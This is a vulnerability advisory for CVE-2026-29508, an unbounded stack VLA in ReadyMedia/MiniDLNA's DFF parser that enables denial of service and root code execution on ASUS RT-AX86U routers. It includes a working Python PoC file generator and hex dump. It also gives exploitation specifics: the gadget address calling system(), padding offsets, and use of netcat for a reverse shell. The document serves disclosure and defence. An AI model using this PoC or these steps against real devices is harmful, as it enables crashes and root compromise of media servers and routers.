# ReadyMedia (MiniDLNA): Unbounded VLA in DFF Parser leads to Stack Buffer Overflow and Remote Code Execution

- **Advisory ID:** MCSAID-2026-044
- **CVE ID:** [CVE-2026-29508](https://www.cve.org/CVERecord?id=CVE-2026-29508)
- **Reported:** 2026-03-09
- **Published:** 2026-11-01
- **Severity:** High (CVSS 8.8 – CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
- **CVSS 4.0:** 8.7 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N)
- **Vulnerability type:** Stack-based buffer overflow, Unbounded variable-length array (VLA) allocation, Remote Code Execution (RCE), Denial of Service (DoS)
- **Current state:** Not fixed upstream (latest ReadyMedia release is 1.3.3); fixed by ASUS in RT-AX86U firmware 3.0.0.4.388_24437
- **Exploitation:** Requires write access to a media directory scanned by ReadyMedia (e.g. SMB share, ASUS AiCloud); RCE demonstrated on ASUS RT-AX86U, DoS on hardened distribution builds; not seen in the wild
- **Software:** [ReadyMedia (formerly MiniDLNA)](https://sourceforge.net/projects/minidlna/) – DFF metadata reader (`tagutils/tagutils-dff.c`)
- **CWE:** [CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html)
- **Discovered by:** Ivan Racic of Marlink Cyber

---

## Summary

ReadyMedia's DFF (DSDIFF) metadata parser, `_get_dfffileinfo()` in `tagutils/tagutils-dff.c`, reads the 64-bit `PROP` chunk size directly from the file and uses it, without any bounds check, as the length of a variable-length array on the stack (`unsigned char propckData[propckDataSize]`). It then `fread()`s that many bytes from the file into the array.

An attacker-controlled size moves the stack pointer arbitrarily far down, past the thread's stack mapping, and the subsequent `fread()` writes attacker-controlled file data at the displaced location. On 32-bit builds a size of `0xFFFFFFFF` wraps the stack pointer so that the program believes it reserved almost no space while still reading nearly 4 GB, which overwrites saved registers and the return address.

Because ReadyMedia uses `inotify` to parse new files as soon as they appear in a watched media directory, dropping a single crafted `.dff` file is enough to trigger the bug. On builds without modern mitigations (ASUS RT-AX86U: no PIE, no stack canary) this leads to code execution as `root`; on hardened builds it results in a crash of the service.

---

## Affected Versions

| Version | Status |
|---------|--------|
| ReadyMedia / MiniDLNA < 1.3.0 | Not affected (no DFF parser) |
| ReadyMedia / MiniDLNA 1.3.0 – 1.3.3 | Vulnerable |
| ASUS RT-AX86U firmware prior to 3.0.0.4.388_24437 | Vulnerable |
| ASUS RT-AX86U firmware 3.0.0.4.388_24437 and later | Fixed |

RCE reproduced on ASUS RT-AX86U running MiniDLNA 1.3.3 (32-bit ARM, `/usr/sbin/minidlna`).

Crash confirmed on MiniDLNA 1.3.3 from the following distributions:

| Distribution | Package | Result |
|--------------|---------|--------|
| Ubuntu 24.04 | minidlna 1.3.3 (apt) | SIGSEGV |
| Debian 12 | minidlna 1.3.3 (apt) | SIGSEGV |
| Fedora 44 | minidlna 1.3.3 (dnf) | SIGSEGV |
| Arch Linux | minidlna 1.3.3-7 (pacman) | SIGSEGV |
| Alpine Linux | minidlna 1.3.3-r3 (apk) | SIGSEGV |
| Raspbian 11 | 1.3.3 built from source with debug symbols | SIGSEGV |

ReadyMedia is also shipped in OpenWrt and DD-WRT firmware and was historically available as an add-on package on some NAS devices (Synology, QNAP, ReadyNAS).

---

## Impact

An attacker who can write a file into any directory ReadyMedia scans can corrupt the stack of the scanner thread.

- **Embedded / router builds without hardening** (no PIE, no stack canaries, partial RELRO): remote code execution as `root`. Demonstrated on the ASUS RT-AX86U, where the attack is reachable from the LAN via SMB and from the WAN via AiCloud.
- **Hardened builds** (PIE, full RELRO, stack canaries, `FORTIFY_SOURCE`, `-fstack-clash-protection`, e.g. Ubuntu 24.04): reliable denial of service of the media server.

A Shodan search for `minidlna` returns about 48,000 results; roughly 7,400 of them report a version in the affected 1.3.0 – 1.3.3 range. The service is far more often exposed only internally.

---

## Exploitation

Preconditions:

- ReadyMedia 1.3.0 – 1.3.3 with a media directory the attacker can write to (e.g. an SMB share on the LAN, or ASUS AiCloud over WAN);
- a user account with write permission on that share.

No user interaction is required: with `inotify=yes` (the ASUS default) the new file is parsed immediately by the scanner thread (`inotify_thread` → `monitor_insert_file` → `insert_file` → `GetAudioMetadata` → `readtags` → `_get_dfffileinfo`).

On the ASUS RT-AX86U (32-bit ARM binary, NX enabled, full ASLR, but **no PIE** and **no stack canary**):

1. The `PROP` chunk size is set to `0xFFFFFFFF`, which wraps the 32-bit `sp` so the VLA allocation leaves the pointer just below its original value while `fread()` still copies attacker data over the saved registers.
2. With 980 bytes of padding after the `PROP` chunk header the attacker controls `pc`, `r0` and `r4`–`r11`, and `sp` points at file data placed right after the `pc` overwrite.
3. Because the binary is not PIE, its own code is at fixed addresses. The sequence at `0x156ec` (`add r0, sp, #8` followed by `bl system@plt`) loads `r0` with a pointer into attacker-controlled stack data and calls `system()`.
4. The command string placed on the stack is executed as `root`. In the demonstration it ran a `netcat` binary dropped on the same share (`/tmp/mnt/...`) for a reverse shell and restarted `minidlna`.

Crash observed on the router (`dmesg`), with the attacker-controlled size `0x41414141` in `x1`:

```
potentially unexpected fatal signal 11.
CPU: 2 PID: 829 Comm: minidlna Tainted: P           O    4.1.52 #2
Hardware name: Broadcom-v8A (DT)
PC is at 0xf6d7c260
LR is at 0x30e7c
sp : 00000000b58013a8
x1 : 0000000041414141 x0 : 00000000b58013b0
```

`pc` control (`gdb` attached to the running service):

```
Thread 2 "minidlna" received signal SIGILL, Illegal instruction.
0x42424242 in ?? ()
(gdb) i r
r0             0xffffffff          4294967295
r4             0x41414141          1094795585
...
r11            0x41414141          1094795585
sp             0xf69408d0          0xf69408d0
pc             0x42424242          0x42424242
```

Call chain on a debug build (Raspbian 11):

```
#0  __GI__IO_fread (buf=0x2d18f3f0, size=1094795585, count=1, fp=0x6dc00aa0) at iofread.c:32
#1  0x00049d24 in _get_dfffileinfo (file=0x6e5a54d8 "/dev/shm/Downloads/poc1.dff", psong=0x6e5a40ac) at tagutils/tagutils-dff.c:132
#2  0x0004d490 in _get_fileinfo (...) at tagutils/tagutils.c:204
#3  0x0004d804 in readtags (...) at tagutils/tagutils.c:304
#4  0x00030e08 in GetAudioMetadata (...) at metadata.c:380
#5  0x00037710 in insert_file (...) at scanner.c:486
#6  0x00039c90 in monitor_insert_file (...) at monitor.c:257
#7  0x0004ed74 in inotify_thread (arg=0x0) at monitor_inotify.c:357
```

### Proof of concept

The following 44-byte file (minimal `FRM8` / `DSD ` / `FVER` header followed by a `PROP` chunk with `ckDataSize = 0x0000000200000000`, ~8 GB) crashes MiniDLNA 1.3.3 on all tested 64-bit distributions:

```
00000000  46 52 4d 38 00 00 00 00 00 00 10 00 44 53 44 20  |FRM8........DSD |
00000010  46 56 45 52 00 00 00 00 00 00 00 04 01 05 00 00  |FVER............|
00000020  50 52 4f 50 00 00 00 02 00 00 00 00              |PROP........|
```

```python
#!/usr/bin/env python3
# Generates poc.dff - crash PoC for CVE-2026-29508 (ReadyMedia DFF parser)
import struct, sys

out = sys.argv[1] if len(sys.argv) > 1 else "poc.dff"
data  = b"FRM8" + struct.pack(">Q", 0x1000) + b"DSD "
data += b"FVER" + struct.pack(">Q", 4) + bytes([0x01, 0x05, 0x00, 0x00])
data += b"PROP" + struct.pack(">Q", 0x200000000)   # unbounded PROP chunk size
open(out, "wb").write(data)
print(f"[+] wrote {out} ({len(data)} bytes)")
```

Copy `poc.dff` into a directory listed in `media_dir`; with `inotify=yes` the service crashes as soon as the file is created.

Ubuntu 24.04 (debug build), crash at the VLA declaration:

```
Thread 2 "minidlnad" received signal SIGSEGV, Segmentation fault.
0x000055cd1fe70348 in _get_dfffileinfo (file=0x7f15a5e48560 "/media/poc.dff", psong=0x7f15a5e47010) at tagutils/tagutils-dff.c:130
130			unsigned char propckData[propckDataSize];
        propckDataSize = 8589934592
        totalcount = 8589934604
        ckbuf = "PROP\000\000\000\002\000\000\000"
```

---

## Details

### Affected code

- **File:** `tagutils/tagutils-dff.c`
- **Function:** `_get_dfffileinfo()`
- **Version checked:** ReadyMedia 1.3.3

```c
		//Property chunk
		if (strncmp((char*)ckbuf, "PROP", 4) == 0)
		{
			propckDataSize = GET_DFF_INT64(ckbuf + 4);
			totalcount += propckDataSize + 12;

			unsigned char propckData[propckDataSize];

			if (!(rt = fread(propckData, propckDataSize, 1, fp)))
			{
				DPRINTF(E_WARN, L_SCANNER, "Could not read Property chunk from %s\n", file);
				fclose(fp);
				return -1;
			}
```

### Root cause

`propckDataSize` is a `uint64_t` assembled with `GET_DFF_INT64()` from eight bytes of the file, immediately after the `PROP` chunk ID. It is never compared against the declared form size, the remaining file size, or any sane upper bound before being used as the length of a stack VLA (line 130) and as the `fread()` size (line 132).

A VLA declaration simply subtracts its length from the stack pointer. A large value moves `sp` outside the thread's stack mapping (and beyond any guard page); on 32-bit targets, where `size_t` is 32 bits, `0xFFFFFFFF` wraps `sp` around so the "allocation" is effectively tiny while `fread()` is still asked to write almost 4 GB. In both cases `fread()` writes file-controlled data into memory that does not belong to the array, corrupting the stack.

---

## Indicators

**On host:**

- Repeated crashes / restarts of `minidlna` / `minidlnad` (`SIGSEGV`, `potentially unexpected fatal signal 11` in `dmesg`) with `_get_dfffileinfo` in the backtrace.
- Small `.dff` files appearing in media directories, especially files whose `PROP` chunk size is larger than the file itself.
- Unexpected child processes of `minidlna` (e.g. shells, `nc`) running as `root`.

**On network:**

- Uploads of `.dff` files to SMB shares or AiCloud folders that are configured as ReadyMedia media directories.

---

## Mitigations

ASUS fixed the issue for the RT-AX86U by adding a bounds check on the `PROP` chunk size:

- Fixed firmware: [ASUS RT-AX86U 3.0.0.4.388_24437](https://www.asus.com/networking-iot-servers/wifi-routers/asus-gaming-routers/rt-ax86u/helpdesk_bios?model2Name=RT-AX86-Series-RT-AX86U-RT-AX86S)

No upstream ReadyMedia release contains a fix; 1.3.3 (2023-06-02) is the latest release.

### Recommended fix

Validate `propckDataSize` before using it: reject values larger than the remaining form/file size and larger than a small fixed maximum (a well-formed `PROP` chunk is only a few dozen bytes), and allocate the buffer on the heap instead of the stack. The same validation should be applied to every chunk size read from the file.

---

## Recommendations

- Update ASUS RT-AX86U routers to firmware 3.0.0.4.388_24437 or later.
- For other platforms shipping ReadyMedia 1.3.0 – 1.3.3, apply a vendor/distribution patch once available or disable the service.
- Do not allow untrusted users to write into ReadyMedia media directories; restrict SMB / AiCloud write access accordingly.
- Do not expose ReadyMedia (8200/tcp), SMB or AiCloud to the Internet.
- Build ReadyMedia with PIE, full RELRO, stack canaries, `FORTIFY_SOURCE` and `-fstack-clash-protection`; with these mitigations the issue degrades from RCE to DoS.

---

## Timeline

- 2026-03-04 – CVE-2026-29508 reserved by VulnCheck
- 2026-03-09 – Vulnerability reported to ASUS via VulnCheck
- 2026-03 – 2026-10 – ASUS provided several test firmware builds, re-tested until the issue was fixed
- 2026-10-22 – ASUS released RT-AX86U firmware 3.0.0.4.388_24437
- 2026-11-01 – Technical write-up released
- 2026-11-02 – CVE-2026-29508 published
- 2026-11-03 – Marlink Cyber advisory released

---

## References

- CVE record: [CVE-2026-29508](https://www.cve.org/CVERecord?id=CVE-2026-29508)
- NVD: [CVE-2026-29508](https://nvd.nist.gov/vuln/detail/cve-2026-29508)
- VulnCheck advisory: [ReadyMedia 1.3.0 - 1.3.3 Stack Buffer Overflow via DFF Parser](https://www.vulncheck.com/advisories/readymedia-stack-buffer-overflow-via-dff-parser)
- ASUS Security Advisory: [asus.com/security-advisory](https://www.asus.com/security-advisory#bulletins)
- ASUS fixed firmware: [RT-AX86U 3.0.0.4.388_24437](https://www.asus.com/networking-iot-servers/wifi-routers/asus-gaming-routers/rt-ax86u/helpdesk_bios?model2Name=RT-AX86-Series-RT-AX86U-RT-AX86S)
- DSDIFF specification: [DSDIFF 1.5](https://sonicstudio.com/pdf/dsd/DSDIFF_1.5_Spec.pdf)
- Marlink Cyber Security Advisory: [MCSAID-2026-044](https://github.com/marlinkcyber/advisories/blob/main/advisories/MCSAID-2026-044-readymedia-minidlna-dff-parser-unbounded-vla-stack-overflow-rce.md)
- Software: [ReadyMedia (MiniDLNA)](https://sourceforge.net/projects/minidlna/)
